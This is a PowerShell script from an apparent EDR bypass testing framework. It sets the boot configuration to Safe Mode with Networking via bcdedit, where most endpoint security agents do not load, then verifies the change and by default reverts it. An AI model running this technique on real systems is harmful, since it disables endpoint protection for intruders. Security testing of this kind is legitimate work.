#==============================================================================
# BP1000.1 - Safe Mode Boot Bypass via bcdedit.exe
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by configuring system to boot into Safe Mode with Network
#   using bcdedit command, then reverts the configuration after verification.
#
# DESCRIPTION
#   This script implements BP-1000.1 technique which uses bcdedit.exe to set
#   the system to boot into Safe Mode with Network on next restart. Most EDR
#   agents do not load in Safe Mode, effectively bypassing their protection.
#   
#   Test Flow:
#   1. Backup current boot configuration
#   2. Execute bypass: bcdedit /set {current} safeboot network
#   3. Verify bypass was applied successfully
#   4. Revert configuration: bcdedit /deletevalue {current} safeboot
#   5. Verify reversion was successful
#   6. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for bcdedit operations)
#   - Windows Vista or later (bcdedit availability)
#
# EXIT CODES
#   0 = Success (bypass applied and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Bypass application failed
#   4 = Bypass verification failed
#   5 = Reversion failed
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1000.1"
$TECHNIQUE_NAME = "Safe Mode Boot via bcdedit"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1000.1-bcdedit"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# BCD constants
$BCD_SAFEBOOT_NETWORK = "network"
$BCD_CURRENT_ENTRY = "{current}"
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-BcdSafebootValue {
    try {
        Write-Log "Querying current BCD safeboot configuration..." -Level "DEBUG"
        
        $bcdOutput = & bcdedit /enum "{current}" 2>&1
        if ($LASTEXITCODE -ne 0) {
            throw "bcdedit command failed with exit code: $LASTEXITCODE"
        }
        
        $safebootLine = $bcdOutput | Where-Object { $_ -match "safeboot\s+(.+)" }
        
        if ($safebootLine) {
            $safebootValue = ($safebootLine -split '\s+')[-1]
            Write-Log "Current safeboot value: $safebootValue" -Level "DEBUG"
            return $safebootValue
        }
        else {
            Write-Log "No safeboot value currently set" -Level "DEBUG"
            return $null
        }
    }
    catch {
        Write-Log "Failed to query BCD safeboot value: $($_.Exception.Message)" -Level "ERROR"
        throw
    }
}

function Test-BcdToolAvailability {
    try {
        Write-Log "Testing bcdedit tool availability..." -Level "DEBUG"
        
        $testOutput = & bcdedit /? 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Log "bcdedit tool is available and accessible" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "bcdedit tool returned error code: $LASTEXITCODE" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "bcdedit tool is not available: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    try {
        Write-Log "Backing up original BCD safeboot configuration..." -Level "INFO"
        
        $originalValue = Get-BcdSafebootValue
        
        $global:OriginalState = @{
            SafebootValue = $originalValue
            BackupTime = Get-Date
        }
        
        if ($originalValue) {
            Write-Log "Original safeboot value backed up: $originalValue" -Level "INFO"
        }
        else {
            Write-Log "No original safeboot value to backup (normal boot)" -Level "INFO"
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-BypassTechnique {
    try {
        Write-Log "Executing BP1000.1 bypass technique..." -Level "INFO"
        Write-Log "Command: bcdedit /set {current} safeboot network" -Level "INFO"
        
        # Execute the bypass command
        $bypassOutput = & bcdedit /set $BCD_CURRENT_ENTRY safeboot $BCD_SAFEBOOT_NETWORK 2>&1
        $bypassExitCode = $LASTEXITCODE
        
        Write-Log "bcdedit output: $bypassOutput" -Level "DEBUG"
        Write-Log "bcdedit exit code: $bypassExitCode" -Level "DEBUG"
        
        if ($bypassExitCode -ne 0) {
            throw "bcdedit command failed with exit code: $bypassExitCode. Output: $bypassOutput"
        }
        
        Write-Log "Bypass command executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to execute bypass technique: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-BypassSuccess {
    try {
        Write-Log "Verifying bypass was applied successfully..." -Level "INFO"
        
        # Small delay to ensure BCD changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-BcdSafebootValue
        
        if ($currentValue -eq $BCD_SAFEBOOT_NETWORK) {
            Write-Log "Bypass verification successful - safeboot set to: $currentValue" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Bypass verification failed - expected '$BCD_SAFEBOOT_NETWORK', got '$currentValue'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    try {
        Write-Log "Reverting system to original state..." -Level "INFO"
        
        if ($global:OriginalState.SafebootValue) {
            # Restore original safeboot value
            Write-Log "Restoring original safeboot value: $($global:OriginalState.SafebootValue)" -Level "INFO"
            $restoreOutput = & bcdedit /set $BCD_CURRENT_ENTRY safeboot $global:OriginalState.SafebootValue 2>&1
            $restoreExitCode = $LASTEXITCODE
        }
        else {
            # Remove safeboot value to restore normal boot
            Write-Log "Removing safeboot value to restore normal boot" -Level "INFO"
            $restoreOutput = & bcdedit /deletevalue $BCD_CURRENT_ENTRY safeboot 2>&1
            $restoreExitCode = $LASTEXITCODE
        }
        
        Write-Log "Reversion command output: $restoreOutput" -Level "DEBUG"
        Write-Log "Reversion command exit code: $restoreExitCode" -Level "DEBUG"
        
        if ($restoreExitCode -ne 0) {
            throw "Reversion command failed with exit code: $restoreExitCode. Output: $restoreOutput"
        }
        
        Write-Log "State reversion command executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert system state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-ReversionSuccess {
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure BCD changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-BcdSafebootValue
        $expectedValue = $global:OriginalState.SafebootValue
        
        if ($currentValue -eq $expectedValue) {
            Write-Log "Reversion verification successful - safeboot value restored to: $currentValue" -Level "INFO"
            return $true
        }
        else {
            Write-Log "Reversion verification failed - expected '$expectedValue', got '$currentValue'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for bcdedit operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check bcdedit availability
        if (-not (Test-BcdToolAvailability)) {
            $errorMsg = "bcdedit tool is not available or accessible"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        Write-Log "bcdedit tool availability confirmed" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState)) {
            $errorMsg = "Failed to backup original system state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute bypass technique
        if (-not (Invoke-BypassTechnique)) {
            $errorMsg = "Failed to execute bypass technique"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 3
        }
        
        # Verify bypass was applied
        if (-not (Test-BypassSuccess)) {
            $errorMsg = "Bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SYSTEM STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion)) {
                $errorMsg = "Failed to revert system state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            if (-not (Test-ReversionSuccess)) {
                $errorMsg = "State reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            Write-Log "System state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "State reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        $successMsg = "BP1000.1 bypass technique executed and verified successfully"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            OriginalSafebootValue = $global:OriginalState.SafebootValue
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion